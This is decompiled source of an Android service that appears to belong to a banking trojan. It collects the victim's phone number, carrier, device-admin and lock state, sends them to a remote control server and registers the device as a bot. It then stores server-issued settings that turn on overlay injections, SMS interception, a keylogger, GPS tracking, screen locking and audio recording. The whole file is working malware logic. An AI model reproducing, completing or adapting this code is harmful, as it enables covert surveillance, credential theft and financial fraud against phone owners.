package wocwvy.czyxoxmbauu.slsa;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

public class ukhakhcgifofl extends IntentService {

    /* renamed from: a */
    C0039c f570a = new C0039c();

    /* renamed from: b */
    C0034b f571b = new C0034b();

    /* renamed from: c */
    C0033a f572c = new C0033a();

    /* renamed from: d */
    Context f573d;

    /* renamed from: e */
    String f574e;

    /* renamed from: f */
    String f575f = "0";

    /* renamed from: g */
    String f576g = "0";

    /* renamed from: h */
    String f577h = "";

    /* renamed from: i */
    String f578i = "";

    /* renamed from: j */
    String f579j = "";

    /* renamed from: k */
    String f580k = "";

    /* renamed from: l */
    String f581l = "ERROR";

    /* renamed from: m */
    String f582m;

    /* renamed from: n */
    TelephonyManager f583n;

    /* renamed from: o */
    int f584o = 0;

    /* renamed from: p */
    int f585p = 0;

    /* renamed from: q */
    int f586q = 0;

    /* renamed from: r */
    int f587r = 0;

    public ukhakhcgifofl() {
        super("");
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public String mo450a(String str) {
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(openFileInput(str)));
            String str2 = "";
            while (true) {
                String readLine = bufferedReader.readLine();
                if (readLine == null) {
                    return str2;
                }
                StringBuilder sb = new StringBuilder();
                sb.append(str2);
                sb.append(readLine);
                str2 = sb.toString();
            }
        } catch (IOException unused) {
            return "";
        }
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(9:395|396|397|398|(5:399|400|401|402|403)|406|407|424|415) */
    /* JADX WARNING: Code restructure failed: missing block: B:33:0x0108, code lost:
        if (r1.f571b.mo237g(r1.f573d) != false) goto L_0x010a;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:406:0x103a */
    /* JADX WARNING: Removed duplicated region for block: B:149:0x064f  */
    /* JADX WARNING: Removed duplicated region for block: B:355:0x0e93 A[SYNTHETIC, Splitter:B:355:0x0e93] */
    /* JADX WARNING: Removed duplicated region for block: B:365:0x0eec  */
    /* JADX WARNING: Removed duplicated region for block: B:369:0x0f51 A[Catch:{ Exception -> 0x0f78 }] */
    /* JADX WARNING: Removed duplicated region for block: B:372:0x0f6d A[Catch:{ Exception -> 0x0f78 }] */
    /* JADX WARNING: Removed duplicated region for block: B:378:0x0f93 A[Catch:{ Exception -> 0x0fb5 }] */
    /* JADX WARNING: Removed duplicated region for block: B:385:0x0fc4 A[SYNTHETIC, Splitter:B:385:0x0fc4] */
    /* JADX WARNING: Removed duplicated region for block: B:62:0x017f A[Catch:{ Exception -> 0x018b }] */
    /* JADX WARNING: Removed duplicated region for block: B:63:0x0181 A[Catch:{ Exception -> 0x018b }] */
    /* JADX WARNING: Removed duplicated region for block: B:70:0x0192  */
    /* JADX WARNING: Removed duplicated region for block: B:71:0x01a3  */
    /* JADX WARNING: Removed duplicated region for block: B:74:0x0278  */
    /* JADX WARNING: Removed duplicated region for block: B:75:0x03a4  */
    /* renamed from: a */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void mo451a() {
        /*
            r18 = this;
            r1 = r18
            wocwvy.czyxoxmbauu.slsa.b r2 = r1.f571b
            android.content.Context r3 = r1.f573d
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.jtfxlnc> r4 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.class
            boolean r2 = r2.mo215a(r3, r4)
            if (r2 != 0) goto L_0x0018
            android.content.Intent r2 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.jtfxlnc> r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.class
            r2.<init>(r1, r3)
            r1.startService(r2)
        L_0x0018:
            java.util.concurrent.TimeUnit r2 = java.util.concurrent.TimeUnit.SECONDS     // Catch:{ InterruptedException -> 0x0020 }
            r3 = 2
            r2.sleep(r3)     // Catch:{ InterruptedException -> 0x0020 }
            goto L_0x0025
        L_0x0020:
            r0 = move-exception
            r2 = r0
            r2.printStackTrace()
        L_0x0025:
            java.lang.String r2 = "phone"
            java.lang.Object r2 = r1.getSystemService(r2)
            android.telephony.TelephonyManager r2 = (android.telephony.TelephonyManager) r2
            r1.f583n = r2
            wocwvy.czyxoxmbauu.slsa.b r2 = r1.f571b
            java.lang.String r2 = r2.mo247q(r1)
            java.lang.String r3 = android.os.Build.VERSION.RELEASE
            java.lang.StringBuilder r4 = new java.lang.StringBuilder
            r4.<init>()
            java.lang.String r5 = android.os.Build.MODEL
            r4.append(r5)
            java.lang.String r5 = " ("
            r4.append(r5)
            java.lang.String r5 = android.os.Build.PRODUCT
            r4.append(r5)
            java.lang.String r5 = ")"
            r4.append(r5)
            java.lang.String r4 = r4.toString()
            android.telephony.TelephonyManager r5 = r1.f583n
            java.lang.String r5 = r5.getNetworkCountryIso()
            android.content.Context r6 = r1.f573d
            java.lang.String r7 = "android.permission.READ_PHONE_STATE"
            int r6 = r6.checkCallingOrSelfPermission(r7)
            if (r6 != 0) goto L_0x008c
            java.lang.StringBuilder r6 = new java.lang.StringBuilder
            r6.<init>()
            java.lang.String r7 = "("
            r6.append(r7)
            android.telephony.TelephonyManager r7 = r1.f583n
            java.lang.String r7 = r7.getNetworkOperatorName()
            r6.append(r7)
            java.lang.String r7 = ")"
            r6.append(r7)
            android.telephony.TelephonyManager r7 = r1.f583n
            java.lang.String r7 = r7.getLine1Number()
            r6.append(r7)
            java.lang.String r6 = r6.toString()
            r1.f579j = r6
            goto L_0x0094
        L_0x008c:
            java.lang.String r6 = "(NO)"
            r1.f579j = r6
            java.lang.String r6 = "Indefined"
            r1.f580k = r6
        L_0x0094:
            java.lang.String r6 = "device_policy"
            java.lang.Object r6 = r1.getSystemService(r6)
            android.app.admin.DevicePolicyManager r6 = (android.app.admin.DevicePolicyManager) r6
            android.content.ComponentName r7 = new android.content.ComponentName
            android.content.Context r8 = r1.f573d
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.a.a> r9 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p002a.C0064a.class
            r7.<init>(r8, r9)
            boolean r6 = r6.isAdminActive(r7)
            if (r6 == 0) goto L_0x00af
            java.lang.String r6 = "1"
            r1.f575f = r6
        L_0x00af:
            android.content.Context r6 = r1.f573d
            java.lang.String r6 = "keyguard"
            java.lang.Object r6 = r1.getSystemService(r6)
            android.app.KeyguardManager r6 = (android.app.KeyguardManager) r6
            boolean r6 = r6.inKeyguardRestrictedInputMode()
            if (r6 != 0) goto L_0x00c3
            java.lang.String r6 = "1"
            r1.f576g = r6
        L_0x00c3:
            r6 = 0
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b     // Catch:{ Exception -> 0x00e6 }
            android.content.Context r8 = r1.f573d     // Catch:{ Exception -> 0x00e6 }
            java.lang.String r9 = "SettingsAll"
            java.lang.String r7 = r7.mo234e(r8, r9)     // Catch:{ Exception -> 0x00e6 }
            r1.f574e = r7     // Catch:{ Exception -> 0x00e6 }
            java.lang.String r7 = r1.f574e     // Catch:{ Exception -> 0x00e6 }
            java.lang.String r8 = ""
            if (r7 == r8) goto L_0x00e3
            java.lang.String r7 = r1.f574e     // Catch:{ Exception -> 0x00e6 }
            java.lang.String r8 = "~"
            java.lang.String[] r7 = r7.split(r8)     // Catch:{ Exception -> 0x00e6 }
            r7 = r7[r6]     // Catch:{ Exception -> 0x00e6 }
        L_0x00e0:
            r1.f574e = r7     // Catch:{ Exception -> 0x00e6 }
            goto L_0x00ea
        L_0x00e3:
            java.lang.String r7 = ""
            goto L_0x00e0
        L_0x00e6:
            java.lang.String r7 = ""
            r1.f574e = r7
        L_0x00ea:
            int r7 = android.os.Build.VERSION.SDK_INT
            r8 = 24
            r9 = 1
            if (r7 < r8) goto L_0x010a
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b
            android.content.Context r10 = r1.f573d
            boolean r7 = r7.mo238h(r10)
            if (r7 == 0) goto L_0x00fe
            r1.f584o = r9
            goto L_0x0100
        L_0x00fe:
            r1.f584o = r6
        L_0x0100:
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b
            android.content.Context r10 = r1.f573d
            boolean r7 = r7.mo237g(r10)
            if (r7 == 0) goto L_0x010c
        L_0x010a:
            r1.f584o = r9
        L_0x010c:
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b
            android.content.Context r10 = r1.f573d
            boolean r7 = r7.mo237g(r10)
            if (r7 == 0) goto L_0x0119
            r1.f586q = r9
            goto L_0x011b
        L_0x0119:
            r1.f586q = r6
        L_0x011b:
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b
            android.content.Context r10 = r1.f573d
            boolean r7 = r7.mo241k(r10)
            if (r7 == 0) goto L_0x0128
            r1.f585p = r9
            goto L_0x012a
        L_0x0128:
            r1.f585p = r6
        L_0x012a:
            int r7 = android.os.Build.VERSION.SDK_INT
            r10 = 19
            if (r7 < r10) goto L_0x0144
            java.lang.String r7 = android.provider.Telephony.Sms.getDefaultSmsPackage(r18)
            java.lang.String r10 = r18.getPackageName()
            boolean r7 = r7.equals(r10)
            if (r7 == 0) goto L_0x0141
            r1.f587r = r9
            goto L_0x015b
        L_0x0141:
            r1.f587r = r6
            goto L_0x015b
        L_0x0144:
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b     // Catch:{ Exception -> 0x0141 }
            android.content.Context r10 = r1.f573d     // Catch:{ Exception -> 0x0141 }
            java.lang.String r11 = "del_sws"
            java.lang.String r7 = r7.mo234e(r10, r11)     // Catch:{ Exception -> 0x0141 }
            java.lang.String r10 = "true"
            boolean r7 = r7.contains(r10)     // Catch:{ Exception -> 0x0141 }
            if (r7 == 0) goto L_0x0159
            r1.f587r = r9     // Catch:{ Exception -> 0x0141 }
            goto L_0x015b
        L_0x0159:
            r1.f587r = r6     // Catch:{ Exception -> 0x0141 }
        L_0x015b:
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b     // Catch:{ Exception -> 0x0166 }
            java.lang.String r10 = "time_work"
            java.lang.String r7 = r7.mo234e(r1, r10)     // Catch:{ Exception -> 0x0166 }
            r1.f581l = r7     // Catch:{ Exception -> 0x0166 }
            goto L_0x016f
        L_0x0166:
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b
            java.lang.String r10 = "TimeWork"
            java.lang.String r11 = "ERROR -> ukhakhcgifofl"
            r7.mo213a(r10, r11)
        L_0x016f:
            wocwvy.czyxoxmbauu.slsa.b r10 = r1.f571b     // Catch:{ Exception -> 0x018b }
            java.lang.String r11 = "play_protect"
            java.lang.String r10 = r10.mo234e(r1, r11)     // Catch:{ Exception -> 0x018b }
            java.lang.String r11 = "true"
            boolean r11 = r10.equals(r11)     // Catch:{ Exception -> 0x018b }
            if (r11 == 0) goto L_0x0181
            r10 = 1
            goto L_0x018c
        L_0x0181:
            java.lang.String r11 = "false"
            boolean r10 = r10.equals(r11)     // Catch:{ Exception -> 0x018b }
            if (r10 == 0) goto L_0x018b
            r10 = 0
            goto L_0x018c
        L_0x018b:
            r10 = 2
        L_0x018c:
            int r11 = android.os.Build.VERSION.SDK_INT
            r12 = 23
            if (r11 < r12) goto L_0x01a3
            java.lang.String r11 = "power"
            java.lang.Object r11 = r1.getSystemService(r11)
            android.os.PowerManager r11 = (android.os.PowerManager) r11
            java.lang.String r12 = r18.getPackageName()
            boolean r11 = r11.isIgnoringBatteryOptimizations(r12)
            goto L_0x01a4
        L_0x01a3:
            r11 = 1
        L_0x01a4:
            wocwvy.czyxoxmbauu.slsa.b r12 = r1.f571b
            java.lang.String r13 = "step"
            java.lang.String r12 = r12.mo234e(r1, r13)
            int r12 = java.lang.Integer.parseInt(r12)
            wocwvy.czyxoxmbauu.slsa.b r13 = r1.f571b
            wocwvy.czyxoxmbauu.slsa.b r14 = r1.f571b
            android.content.Context r15 = r1.f573d
            java.lang.String r8 = "2"
            java.lang.StringBuilder r7 = new java.lang.StringBuilder
            r7.<init>()
            java.lang.String r9 = "p="
            r7.append(r9)
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b
            java.lang.StringBuilder r6 = new java.lang.StringBuilder
            r6.<init>()
            r6.append(r2)
            r16 = r4
            java.lang.String r4 = ":"
            r6.append(r4)
            java.lang.String r4 = r1.f575f
            r6.append(r4)
            java.lang.String r4 = ":"
            r6.append(r4)
            java.lang.String r4 = r1.f574e
            r6.append(r4)
            java.lang.String r4 = ":"
            r6.append(r4)
            int r4 = r1.f584o
            r6.append(r4)
            java.lang.String r4 = ":"
            r6.append(r4)
            int r4 = r1.f585p
            r6.append(r4)
            java.lang.String r4 = ":"
            r6.append(r4)
            int r4 = r1.f587r
            r6.append(r4)
            java.lang.String r4 = ":"
            r6.append(r4)
            java.lang.String r4 = r1.f576g
            r6.append(r4)
            java.lang.String r4 = ":"
            r6.append(r4)
            int r4 = r1.f586q
            r6.append(r4)
            java.lang.String r4 = ":"
            r6.append(r4)
            java.lang.String r4 = r1.f581l
            r6.append(r4)
            java.lang.String r4 = ":"
            r6.append(r4)
            r6.append(r10)
            java.lang.String r4 = ":"
            r6.append(r4)
            r6.append(r11)
            java.lang.String r4 = ":"
            r6.append(r4)
            r6.append(r12)
            java.lang.String r4 = ":"
            r6.append(r4)
            java.lang.String r4 = r6.toString()
            java.lang.String r4 = r9.mo225c(r4)
            r7.append(r4)
            java.lang.String r4 = r7.toString()
            java.lang.String r4 = r14.mo218b(r15, r8, r4)
            java.lang.String r4 = r13.mo230d(r4)
            r1.f582m = r4
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b
            java.lang.String r6 = "Запрос"
            java.lang.StringBuilder r7 = new java.lang.StringBuilder
            r7.<init>()
            java.lang.String r8 = " - > "
            r7.append(r8)
            java.lang.String r8 = r1.f582m
            r7.append(r8)
            java.lang.String r7 = r7.toString()
            r4.mo213a(r6, r7)
            java.lang.String r4 = r1.f582m
            java.lang.String r6 = "|NO|"
            boolean r4 = r4.contains(r6)
            if (r4 == 0) goto L_0x03a4
            wocwvy.czyxoxmbauu.slsa.a r4 = r1.f572c
            java.lang.String r4 = r4.mo206a(r1)
            r1.f577h = r4
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b
            android.content.Context r6 = r1.f573d
            java.lang.String r7 = "iconCJ"
            java.lang.String r4 = r4.mo234e(r6, r7)
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f571b
            java.lang.String r7 = "ICON SEND"
            java.lang.StringBuilder r8 = new java.lang.StringBuilder
            r8.<init>()
            java.lang.String r9 = ""
            r8.append(r9)
            r8.append(r4)
            java.lang.String r8 = r8.toString()
            r6.mo213a(r7, r8)
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f571b
            java.lang.String r7 = ""
            java.lang.String r8 = "Регаем"
            r6.mo213a(r7, r8)
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f571b
            java.lang.String r7 = "set_data_p"
            wocwvy.czyxoxmbauu.slsa.b r8 = r1.f571b
            java.lang.StringBuilder r9 = new java.lang.StringBuilder
            r9.<init>()
            r9.append(r2)
            java.lang.String r10 = ":"
            r9.append(r10)
            java.lang.String r10 = r1.f579j
            r9.append(r10)
            java.lang.String r10 = r1.f580k
            r9.append(r10)
            java.lang.String r10 = ":"
            r9.append(r10)
            r9.append(r3)
            java.lang.String r10 = ":"
            r9.append(r10)
            r9.append(r5)
            java.lang.String r10 = ":"
            r9.append(r10)
            java.lang.String r10 = r1.f577h
            r9.append(r10)
            java.lang.String r10 = ":"
            r9.append(r10)
            r10 = r16
            r9.append(r10)
            java.lang.String r11 = ":"
            r9.append(r11)
            java.lang.String r11 = r1.f578i
            r9.append(r11)
            java.lang.String r11 = ":"
            r9.append(r11)
            r9.append(r4)
            java.lang.String r9 = r9.toString()
            java.lang.String r8 = r8.mo225c(r9)
            r6.mo213a(r7, r8)
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f571b
            android.content.Context r7 = r1.f573d
            java.lang.String r8 = "1"
            java.lang.StringBuilder r9 = new java.lang.StringBuilder
            r9.<init>()
            java.lang.String r11 = "p="
            r9.append(r11)
            wocwvy.czyxoxmbauu.slsa.b r11 = r1.f571b
            java.lang.StringBuilder r12 = new java.lang.StringBuilder
            r12.<init>()
            r12.append(r2)
            java.lang.String r13 = ":"
            r12.append(r13)
            java.lang.String r13 = r1.f579j
            r12.append(r13)
            java.lang.String r13 = r1.f580k
            r12.append(r13)
            java.lang.String r13 = ":"
            r12.append(r13)
            r12.append(r3)
            java.lang.String r3 = ":"
            r12.append(r3)
            r12.append(r5)
            java.lang.String r3 = ":"
            r12.append(r3)
            java.lang.String r3 = r1.f577h
            r12.append(r3)
            java.lang.String r3 = ":"
            r12.append(r3)
            r12.append(r10)
            java.lang.String r3 = ":"
            r12.append(r3)
            wocwvy.czyxoxmbauu.slsa.c r3 = r1.f570a
            r3.getClass()
            java.lang.String r3 = "nhb"
            r12.append(r3)
            java.lang.String r3 = ":"
            r12.append(r3)
            java.lang.String r3 = r1.f578i
            r12.append(r3)
            java.lang.String r3 = ":"
            r12.append(r3)
            r12.append(r4)
            java.lang.String r3 = ":"
            r12.append(r3)
            java.lang.String r3 = r12.toString()
            java.lang.String r3 = r11.mo225c(r3)
            r9.append(r3)
            java.lang.String r3 = r9.toString()
            java.lang.String r3 = r6.mo218b(r7, r8, r3)
            r1.f582m = r3
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b
            java.lang.String r4 = "Responce"
            java.lang.String r5 = r1.f582m
            r3.mo213a(r4, r5)
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b
            java.lang.String r4 = r1.f582m
            java.lang.String r3 = r3.mo230d(r4)
            r1.f582m = r3
            goto L_0x0632
        L_0x03a4:
            java.lang.String r3 = r1.f582m
            java.lang.String r4 = "state1letsgotxt"
            boolean r3 = r3.contains(r4)
            if (r3 == 0) goto L_0x048c
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b
            android.content.Context r4 = r1.f573d
            java.lang.String r5 = "3"
            java.lang.StringBuilder r6 = new java.lang.StringBuilder
            r6.<init>()
            java.lang.String r7 = "p="
            r6.append(r7)
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b
            java.lang.String r7 = r7.mo225c(r2)
            r6.append(r7)
            java.lang.String r6 = r6.toString()
            java.lang.String r3 = r3.mo218b(r4, r5, r6)
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b
            java.lang.String r3 = r4.mo230d(r3)
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b
            java.lang.String r5 = "Настройки"
            java.lang.StringBuilder r6 = new java.lang.StringBuilder
            r6.<init>()
            java.lang.String r7 = ""
            r6.append(r7)
            r6.append(r3)
            java.lang.String r6 = r6.toString()
            r4.mo213a(r5, r6)
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0484 }
            java.lang.String r5 = "Запись  успешна!"
            r4.mo213a(r5, r3)     // Catch:{ Exception -> 0x0484 }
            java.lang.String r4 = ":"
            java.lang.String[] r3 = r3.split(r4)     // Catch:{ Exception -> 0x0484 }
            r4 = 0
            r5 = r3[r4]     // Catch:{ Exception -> 0x0484 }
            r6 = r3[r4]     // Catch:{ Exception -> 0x0484 }
            java.lang.String r7 = ""
            boolean r6 = r6.equals(r7)     // Catch:{ Exception -> 0x0484 }
            if (r6 != 0) goto L_0x0410
            r6 = r3[r4]     // Catch:{ Exception -> 0x0484 }
            r4 = 0
            boolean r4 = r6.equals(r4)     // Catch:{ Exception -> 0x0484 }
            if (r4 == 0) goto L_0x0419
        L_0x0410:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0484 }
            java.lang.String r6 = "lock_inj"
            java.lang.String r7 = ""
            r4.mo233d(r1, r6, r7)     // Catch:{ Exception -> 0x0484 }
        L_0x0419:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0484 }
            java.lang.String r6 = "save_inj"
            r4.mo233d(r1, r6, r5)     // Catch:{ Exception -> 0x0484 }
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0484 }
            java.lang.String r5 = "del_sws"
            r6 = 1
            r7 = r3[r6]     // Catch:{ Exception -> 0x0484 }
            r4.mo233d(r1, r5, r7)     // Catch:{ Exception -> 0x0484 }
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0484 }
            java.lang.String r5 = "perehvat_sws"
            r6 = 2
            r7 = r3[r6]     // Catch:{ Exception -> 0x0484 }
            r4.mo233d(r1, r5, r7)     // Catch:{ Exception -> 0x0484 }
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0484 }
            java.lang.String r5 = "network"
            r6 = 3
            r6 = r3[r6]     // Catch:{ Exception -> 0x0484 }
            r4.mo233d(r1, r5, r6)     // Catch:{ Exception -> 0x0484 }
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0484 }
            java.lang.String r5 = "gps"
            r6 = 4
            r6 = r3[r6]     // Catch:{ Exception -> 0x0484 }
            r4.mo233d(r1, r5, r6)     // Catch:{ Exception -> 0x0484 }
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0484 }
            java.lang.String r5 = "foregroundwhile"
            r6 = 5
            r6 = r3[r6]     // Catch:{ Exception -> 0x0484 }
            r4.mo233d(r1, r5, r6)     // Catch:{ Exception -> 0x0484 }
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0484 }
            java.lang.String r5 = "keylogger"
            r6 = 6
            r6 = r3[r6]     // Catch:{ Exception -> 0x0484 }
            r4.mo233d(r1, r5, r6)     // Catch:{ Exception -> 0x0484 }
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0484 }
            java.lang.String r5 = "lookscreen"
            r6 = 8
            r6 = r3[r6]     // Catch:{ Exception -> 0x0484 }
            r4.mo233d(r1, r5, r6)     // Catch:{ Exception -> 0x0484 }
            java.lang.String r4 = "0"
            r5 = 7
            r3 = r3[r5]     // Catch:{ Exception -> 0x0475 }
            java.lang.String r5 = " "
            java.lang.String r6 = ""
            java.lang.String r3 = r3.replace(r5, r6)     // Catch:{ Exception -> 0x0475 }
            goto L_0x0476
        L_0x0475:
            r3 = r4
        L_0x0476:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0484 }
            java.lang.String r5 = "recordsoundseconds"
            r4.mo233d(r1, r5, r3)     // Catch:{ Exception -> 0x0484 }
            java.lang.String r4 = "save seconds sound"
            android.util.Log.e(r4, r3)     // Catch:{ Exception -> 0x0484 }
            goto L_0x0632
        L_0x0484:
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b
            java.lang.String r4 = "Настройки"
        L_0x0488:
            java.lang.String r5 = "Запись не good!"
            goto L_0x062f
        L_0x048c:
            java.lang.String r3 = r1.f582m
            java.lang.String r4 = "ALLSETTINGSGO"
            boolean r3 = r3.contains(r4)
            if (r3 == 0) goto L_0x056b
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b
            android.content.Context r4 = r1.f573d
            java.lang.String r5 = "6"
            java.lang.StringBuilder r6 = new java.lang.StringBuilder
            r6.<init>()
            java.lang.String r7 = "p="
            r6.append(r7)
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b
            java.lang.String r7 = r7.mo225c(r2)
            r6.append(r7)
            java.lang.String r6 = r6.toString()
            java.lang.String r3 = r3.mo218b(r4, r5, r6)
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b
            java.lang.String r3 = r4.mo230d(r3)
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b
            java.lang.String r5 = "Сохраняем настройки"
            r4.mo213a(r5, r3)
            java.lang.String r4 = ""
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x04d2 }
            android.content.Context r6 = r1.f573d     // Catch:{ Exception -> 0x04d2 }
            java.lang.String r7 = "madeSettings"
            java.lang.String r5 = r5.mo234e(r6, r7)     // Catch:{ Exception -> 0x04d2 }
            r4 = r5
            goto L_0x04db
        L_0x04d2:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r6 = "ukhakhcgifofl"
            java.lang.String r7 = "ERROR GetmadeString"
            r5.mo213a(r6, r7)
        L_0x04db:
            java.lang.String r5 = "1 2 3 4 5 6 7 8 9 10 11 12 13 "
            java.lang.String r6 = "5+"
            boolean r6 = r4.contains(r6)
            if (r6 == 0) goto L_0x04ed
            java.lang.String r6 = "5 "
            java.lang.String r7 = "5+"
            java.lang.String r5 = r5.replace(r6, r7)
        L_0x04ed:
            java.lang.String r6 = "6+"
            boolean r6 = r4.contains(r6)
            if (r6 == 0) goto L_0x04fd
            java.lang.String r6 = "6 "
            java.lang.String r7 = "6+"
            java.lang.String r5 = r5.replace(r6, r7)
        L_0x04fd:
            java.lang.String r6 = "7+"
            boolean r6 = r4.contains(r6)
            if (r6 == 0) goto L_0x050d
            java.lang.String r6 = "7 "
            java.lang.String r7 = "7+"
            java.lang.String r5 = r5.replace(r6, r7)
        L_0x050d:
            java.lang.String r6 = "8+"
            boolean r6 = r4.contains(r6)
            if (r6 == 0) goto L_0x051d
            java.lang.String r6 = "8 "
            java.lang.String r7 = "8+"
            java.lang.String r5 = r5.replace(r6, r7)
        L_0x051d:
            java.lang.String r6 = "9+"
            boolean r6 = r4.contains(r6)
            if (r6 == 0) goto L_0x052d
            java.lang.String r6 = "9 "
            java.lang.String r7 = "9+"
            java.lang.String r5 = r5.replace(r6, r7)
        L_0x052d:
            java.lang.String r6 = "10+"
            boolean r4 = r4.contains(r6)
            if (r4 == 0) goto L_0x053d
            java.lang.String r4 = "10 "
            java.lang.String r6 = "10+"
            java.lang.String r5 = r5.replace(r4, r6)
        L_0x053d:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0565 }
            java.lang.String r6 = "SettingsAll"
            r4.mo233d(r1, r6, r3)     // Catch:{ Exception -> 0x0565 }
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b     // Catch:{ Exception -> 0x0565 }
            java.lang.String r4 = "madeSettings"
            r3.mo233d(r1, r4, r5)     // Catch:{ Exception -> 0x0565 }
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b     // Catch:{ Exception -> 0x0565 }
            java.lang.String r4 = "Настройки all"
            java.lang.StringBuilder r6 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0565 }
            r6.<init>()     // Catch:{ Exception -> 0x0565 }
            java.lang.String r7 = "madeSettings: "
            r6.append(r7)     // Catch:{ Exception -> 0x0565 }
            r6.append(r5)     // Catch:{ Exception -> 0x0565 }
            java.lang.String r5 = r6.toString()     // Catch:{ Exception -> 0x0565 }
            r3.mo213a(r4, r5)     // Catch:{ Exception -> 0x0565 }
            goto L_0x0632
        L_0x0565:
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b
            java.lang.String r4 = "Настройки all"
            goto L_0x0488
        L_0x056b:
            java.lang.String r3 = r1.f582m
            java.lang.String r4 = ""
            boolean r3 = r3.equals(r4)
            if (r3 == 0) goto L_0x0632
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b     // Catch:{ Exception -> 0x0629 }
            android.content.Context r4 = r1.f573d     // Catch:{ Exception -> 0x0629 }
            java.lang.String r5 = "urls"
            java.lang.String r3 = r3.mo234e(r4, r5)     // Catch:{ Exception -> 0x0629 }
            java.lang.String r4 = " "
            java.lang.String r5 = ""
            java.lang.String r3 = r3.replace(r4, r5)     // Catch:{ Exception -> 0x0629 }
            java.lang.String r4 = ","
            java.lang.String[] r3 = r3.split(r4)     // Catch:{ Exception -> 0x0629 }
            r4 = 0
        L_0x058e:
            int r5 = r3.length     // Catch:{ Exception -> 0x0629 }
            if (r4 >= r5) goto L_0x05da
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0629 }
            java.lang.String r6 = "url"
            java.lang.StringBuilder r7 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0629 }
            r7.<init>()     // Catch:{ Exception -> 0x0629 }
            java.lang.String r8 = ""
            r7.append(r8)     // Catch:{ Exception -> 0x0629 }
            r8 = r3[r4]     // Catch:{ Exception -> 0x0629 }
            r7.append(r8)     // Catch:{ Exception -> 0x0629 }
            java.lang.String r7 = r7.toString()     // Catch:{ Exception -> 0x0629 }
            r5.mo213a(r6, r7)     // Catch:{ Exception -> 0x0629 }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0629 }
            r6 = r3[r4]     // Catch:{ Exception -> 0x0629 }
            java.lang.String r5 = r5.mo207a(r6)     // Catch:{ Exception -> 0x0629 }
            java.lang.String r6 = "**2**0**0**"
            boolean r5 = r5.contains(r6)     // Catch:{ Exception -> 0x0629 }
            if (r5 == 0) goto L_0x05d7
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0629 }
            java.lang.String r6 = "url"
            java.lang.StringBuilder r7 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0629 }
            r7.<init>()     // Catch:{ Exception -> 0x0629 }
            java.lang.String r8 = ""
            r7.append(r8)     // Catch:{ Exception -> 0x0629 }
